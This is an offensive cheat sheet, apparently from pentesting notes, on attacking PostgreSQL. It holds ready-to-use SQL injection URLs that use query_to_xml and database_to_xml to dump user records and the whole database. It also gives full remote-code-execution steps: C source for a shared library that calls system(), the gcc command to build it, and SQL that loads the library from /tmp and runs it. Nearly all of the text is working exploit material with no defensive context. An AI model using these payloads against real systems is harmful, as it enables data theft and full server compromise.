# Postgres

### Query\_To\_XML

Example:

We can get the result of a query as xml, making data exfiltration a lot faster.

```text
http://127.0.0.1:5000/?order=id&sort=,(CASE%20WHEN%20((SELECT%20CAST(CHR(32)||(SELECT%20query_to_xml('select%20*%20from%20pg_user',true,true,''))%20AS%20NUMERIC)=%271%27))%20THEN%20name%20ELSE%20note%20END)
```

### Database\_To\_XML

We can even get the complete database as XML in a single query!

```text
http://127.0.0.1:5000/?order=id&sort=,(CASE%20WHEN%20((SELECT%20CAST(CHR(32)||(SELECT%20database_to_xml(true,true,''))%20AS%20NUMERIC)=%271%27))%20THEN%20name%20ELSE%20note%20END)
```

### RCE via Config File Overwrite

[https://pulsesecurity.co.nz/articles/postgres-sqli](https://pulsesecurity.co.nz/articles/postgres-sqli)

### Load shared library

```bash
sudo apt-get install postgresql-server-dev-11
```

```c
#include "postgres.h"
#include "fmgr.h"
#include <stdlib.h>

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif


Datum exec(PG_FUNCTION_ARGS){
    system("<cmd>");

};
PG_FUNCTION_INFO_V1(exec);
```

```bash
gcc xct.c -I`pg_config --includedir-server` -fPIC -shared -o xct.so
```

```sql
CREATE OR REPLACE FUNCTION exec()  RETURNS text AS  '/tmp/xct.so', 'exec' LANGUAGE C STRICT;
SELECT exec();
```

